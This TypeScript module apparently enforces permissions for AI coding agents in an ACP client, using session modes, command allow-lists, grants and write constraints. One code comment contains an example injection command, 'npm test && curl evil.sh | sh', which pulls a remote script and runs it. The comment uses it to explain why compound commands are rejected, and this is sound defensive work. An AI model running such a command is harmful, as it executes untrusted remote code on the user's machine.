import type { SessionMode, ToolClass } from '../../shared/ipc'

/**
 * Client-side capability enforcement — the per-session gate.
 *
 * Not to be confused with main/adminPolicy.ts, which is org and repository
 * configuration. That one decides what a user may choose; this one decides
 * whether a given call runs at all.
 *
 * ACP asks agents to call `session/request_permission` before doing anything
 * consequential, but nothing makes them. An agent can call `terminal/create`
 * directly and the client will run it — which makes "nothing runs until you
 * approve it" a statement about the agent's manners, not about this client.
 * That is fine while Copilot is the only agent; it stops being fine the moment
 * the registry opens to anything a user can put on their PATH.
 *
 * So the gate moves here. Every agent->client call that can touch the machine
 * is classified and checked before dispatch:
 *
 *   1. The mode lattice caps what is reachable at all. A chat session cannot
 *      acquire shell access, however many times anyone clicks approve.
 *   2. Within that cap, an ungated call gets a permission card synthesized by
 *      the client. To an agent that never asked, this is indistinguishable
 *      from a slow filesystem.
 *
 * Both rules are evaluated deterministically from structure — the gate never
 * reads prose, and never asks a model whether something looks safe.
 */

/* ------------------------------------------------------------------ lattice */

/**
 * What each mode may reach, regardless of any grant.
 *
 * Ordered, and strictly cumulative: every mode allows everything the previous
 * one did. Anything else would make "raise the mode" an unsafe operation.
 */
const MODE_CAPABILITIES: Record<SessionMode, ToolClass[]> = {
  discuss: [],
  explore: ['fs.read'],
  // Planning reads and reasons; it does not write. Same reach as explore, kept
  // separate because the workflow runtime distinguishes them.
  plan: ['fs.read'],
  edit: ['fs.read', 'fs.write'],
  verify: ['fs.read', 'fs.write', 'terminal'],
  deliver: ['fs.read', 'fs.write', 'terminal']
}

export const MODE_ORDER: SessionMode[] = [
  'discuss',
  'explore',
  'plan',
  'edit',
  'verify',
  'deliver'
]

/**
 * Commands a `verify` step may run without further escalation.
 *
 * Only consulted when a policy carries an explicit allow-list. An interactive
 * session has none, and is governed by the permission card instead — a
 * hard-coded list would be wrong for every repository that does not look like
 * the one it was written against. The workflow runtime sets one per step,
 * where the command set genuinely is known ahead of time.
 */
export const DEFAULT_VERIFY_COMMANDS = [
  'npm test',
  'npm run test',
  'npm run lint',
  'npm run build',
  'npm run typecheck',
  'yarn test',
  'pnpm test',
  'jest',
  'vitest',
  'pytest',
  'go test',
  'cargo test',
  'make test',
  'mvn test',
  'gradle test',
  'dotnet test'
]

/** Additionally permitted once a step reaches `deliver`. */
export const DELIVER_COMMANDS = ['git push', 'git commit', 'git tag', 'gh pr create']

export interface Grant {
  toolClass: ToolClass
  scope: 'once' | 'always'
  /** Terminal only. An `always` grant is bound to what was approved. */
  commandPrefix?: string
  expiresAt?: number
}

export interface SessionPolicy {
  mode: SessionMode
  grants: Grant[]
  /**
   * When present, terminal commands must match one of these prefixes even if a
   * grant exists. Absent means "no command allow-list" — the interactive case.
   */
  commandAllowList?: string[]
  /**
   * Glob patterns this session may not write, from a constraint injected into
   * the run. Checked before grants: a constraint is not something an approval
   * can be talked past, which is the difference between enforcing it and
   * mentioning it in a prompt.
   */
  forbiddenWrites?: string[]
  /** Matcher, injected so this module stays free of glob logic. */
  matchPath?: (pattern: string, path: string) => boolean
}

export function defaultPolicy(): SessionPolicy {
  // An interactive session starts at the top of the lattice with no allow-list,
  // which is exactly today's behaviour: anything is reachable, nothing happens
  // without a card. The lattice earns its keep when the workflow runtime pins a
  // step to `explore` or `edit`; defaulting a chat window to `discuss` would
  // just be a broken app.
  return { mode: 'deliver', grants: [] }
}

export function capabilitiesOf(mode: SessionMode): ToolClass[] {
  return MODE_CAPABILITIES[mode] ?? []
}

export function modeAllows(mode: SessionMode, toolClass: ToolClass): boolean {
  return capabilitiesOf(mode).includes(toolClass)
}

/* --------------------------------------------------------------- classifier */

export interface ClassifiedCall {
  toolClass: ToolClass
  /** Terminal only: the command line, for allow-list and grant matching. */
  command?: string
  /** Filesystem calls only: the path, for constraint matching. */
  path?: string
  /** What the permission card shows if one has to be synthesized. */
  title: string
}

/**
 * What a JSON-RPC method would do if it were allowed to run.
 *
 * Returns null for calls that cannot touch the machine — session/update,
 * permission responses, terminal bookkeeping on an already-approved terminal.
 * Gating those would produce cards for nothing.
 */
/**
 * Unwrap a shell invocation to the command actually being run.
 *
 * Agents overwhelmingly spawn `sh -c "<script>"` rather than the program
 * directly. Left wrapped, the string an allow-list is compared against is
 * "sh -c npm test", which matches no sensible prefix — so a `verify` step told
 * it may run `npm test` could not, while the same list would happily be
 * bypassed by anyone writing the command out longhand. It also breaks matching
 * an approval to the call that follows it, since the two arrive in different
 * shapes.
 */
function unwrapShell(command: string, args: string[]): string {
  const shell = command.split('/').pop() ?? command
  if (['sh', 'bash', 'zsh', 'dash'].includes(shell)) {
    const flag = args.indexOf('-c')
    if (flag !== -1 && args[flag + 1]) return args[flag + 1]
  }
  return [command, ...args].filter(Boolean).join(' ')
}

export function classify(method: string, params: unknown): ClassifiedCall | null {
  const p = (params ?? {}) as Record<string, unknown>
  switch (method) {
    case 'fs/read_text_file':
      return { toolClass: 'fs.read', path: String(p.path ?? ''), title: `Read ${String(p.path ?? '')}` }
    case 'fs/write_text_file':
      return { toolClass: 'fs.write', path: String(p.path ?? ''), title: `Write ${String(p.path ?? '')}` }
    case 'terminal/create': {
      const command = unwrapShell(String(p.command ?? ''), (p.args as string[] | undefined) ?? [])
      return { toolClass: 'terminal', command, title: command || 'Run a command' }
    }
    default:
      return null
  }
}

/* ---------------------------------------------------------------- decisions */

export type Decision =
  | { kind: 'allow' }
  /** The mode forbids this outright; no card, because no answer would help. */
  | { kind: 'deny'; reason: string }
  /** Permitted in principle, but nobody has approved it yet. */
  | { kind: 'ask' }

const normalize = (c: string): string => c.trim().replace(/\s+/g, ' ')

/**
 * Whether a command line composes more than one command.
 *
 * Prefix matching against a shell string is only sound for a single command.
 * `npm test && curl evil.sh | sh` starts with `npm test`, so an allow-list
 * containing "npm test" would wave it through — the allow-list would be
 * decorative in exactly the situation it exists for. There is no safe way to
 * prefix-match a compound command, so a compound command is never matched.
 */
function isCompound(command: string): boolean {
  return /[;&|`\n><]|\$\(/.test(command)
}

function matchesPrefix(command: string, prefixes: string[]): boolean {
  const normalized = normalize(command)
  if (isCompound(normalized)) return false
  return prefixes.some((prefix) => {
    const p = normalize(prefix)
    // Word boundary, so "npm test" does not authorise
    // "npm testify-and-delete-everything".
    return normalized === p || normalized.startsWith(p + ' ')
  })
}

function grantCovers(grant: Grant, call: ClassifiedCall, now: number): boolean {
  if (grant.toolClass !== call.toolClass) return false
  if (grant.expiresAt !== undefined && grant.expiresAt <= now) return false
  if (grant.commandPrefix === undefined) return true
  if (call.command === undefined) return false
  // Exact, not prefix. A grant is minted from one specific approved command, so
  // "always allow" means that command again — not that command plus whatever
  // has been appended to it.
  return normalize(call.command) === normalize(grant.commandPrefix)
}

export function decide(
  policy: SessionPolicy,
  call: ClassifiedCall,
  now: number = Date.now()
): Decision {
  // Constraints outrank everything, including a standing grant. A step told
  // not to touch the schema and then granted blanket permission by a workflow
  // has still been told not to touch the schema.
  if (
    call.toolClass === 'fs.write' &&
    policy.forbiddenWrites?.length &&
    call.path &&
    policy.matchPath
  ) {
    const hit = policy.forbiddenWrites.find((p) => policy.matchPath!(p, call.path!))
    if (hit) {
      return {
        kind: 'deny',
        reason: `A constraint on this run forbids writing ${call.path} (matches ${hit}).`
      }
    }
  }

  if (!modeAllows(policy.mode, call.toolClass)) {
    return {
      kind: 'deny',
      reason:
        `This session is in ${policy.mode} mode, which cannot ${describe(call.toolClass)}. ` +
        `Raising the mode is a deliberate act, not something an approval can do.`
    }
  }

  // The allow-list is a second cap, not a grant: a step told to run tests may
  // run tests, and approving something else does not change that.
  if (call.toolClass === 'terminal' && policy.commandAllowList) {
    const allowed = policy.commandAllowList.concat(
      policy.mode === 'deliver' ? DELIVER_COMMANDS : []
    )
    if (!matchesPrefix(call.command ?? '', allowed)) {
      return {
        kind: 'deny',
        reason: `"${call.command}" is not in this step's allowed command set.`
      }
    }
  }

  // Reads are capped by mode and by workspace containment, and that is enough.
  // A card for every file an agent opens is a card nobody reads.
  if (call.toolClass === 'fs.read') return { kind: 'allow' }

  if (policy.grants.some((g) => grantCovers(g, call, now))) return { kind: 'allow' }

  return { kind: 'ask' }
}

function describe(toolClass: ToolClass): string {
  switch (toolClass) {
    case 'terminal':
      return 'run commands'
    case 'fs.write':
      return 'write files'
    case 'fs.read':
      return 'read files'
  }
}

/* ------------------------------------------------------------------ grants */

/**
 * The grant an approval produces.
 *
 * `once` grants exist because approval and action are two separate JSON-RPC
 * calls: the agent asks, we answer, and then it calls `terminal/create`. Without
 * a short-lived grant the interceptor would card the very thing the user just
 * approved. Deliberately narrow — bound to the exact command, and expiring —
 * so it cannot be reused for a second command later in the turn.
 */
export function grantFor(
  call: ClassifiedCall,
  scope: 'once' | 'always',
  now: number = Date.now()
): Grant {
  return {
    toolClass: call.toolClass,
    scope,
    commandPrefix: call.command,
    expiresAt: scope === 'once' ? now + 120_000 : undefined
  }
}

/**
 * A blanket grant, from the user turning Allow-All on.
 *
 * Still capped by the mode lattice — allow-all cannot reach a class the mode
 * forbids — and still per-session. Without this the interceptor would card
 * every call for a user who explicitly asked not to be asked.
 */
export function allowAllGrants(mode: SessionMode): Grant[] {
  return capabilitiesOf(mode).map((toolClass) => ({ toolClass, scope: 'always' as const }))
}
